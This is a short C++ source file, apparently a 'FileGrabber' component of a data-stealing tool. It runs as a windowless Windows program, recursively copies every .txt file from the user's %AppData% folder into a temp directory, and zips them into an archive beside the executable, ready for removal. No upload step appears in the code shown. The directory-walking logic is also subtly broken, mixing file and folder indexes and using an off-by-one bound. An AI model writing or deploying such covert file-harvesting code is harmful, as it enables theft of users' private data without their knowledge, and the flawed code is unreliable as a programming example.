// FileGrabber.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Utils.h"

void Grab(string sourcePath, string mask, string destPath)
{
	vector<string> files = ListDirectory(sourcePath, mask); //Get files by mask
	vector<string> folders = ListDirectory(sourcePath, "\\*"); //Get everything in directory

	for(int i = 0; i < folders.size(); i++)
	{
		if(i < files.size() - 1) //Count of files can be less
			if(files[i] !=  "." && files[i] != ".." && FileExists((char*)(sourcePath+"\\"+files[i]).c_str())) //Check if file exists and it's not upper dir
				CopyFile((sourcePath+"\\"+files[i]).c_str(), (destPath+"\\"+files[i]).c_str(), false); //Grab file

		if(FileExists((char*)(sourcePath+"\\"+folders[i]).c_str()) && folders[i] !=  "." && folders[i] != "..") //Check if directory exists and it's not upper dir
			Grab(sourcePath+"\\"+folders[i], mask, destPath); //Go to this directory
	}
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	string tempPath = GetTempPath();
	CreateDirectory(tempPath.c_str(), NULL);
	Grab(getenv("AppData"), "\\*.txt", tempPath); //Grab all .txt files from %AppData%
	ZipFolder("test.zip", tempPath); //Archive will be created near the .exe file
	return 0;
}

